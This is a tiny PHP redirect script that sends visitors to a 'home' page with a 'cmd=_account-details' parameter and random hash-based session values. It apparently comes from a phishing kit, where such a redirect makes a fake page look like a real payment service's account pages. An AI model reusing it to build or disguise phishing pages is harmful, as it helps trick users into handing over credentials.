<?php

header("location: home?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
exit;

?>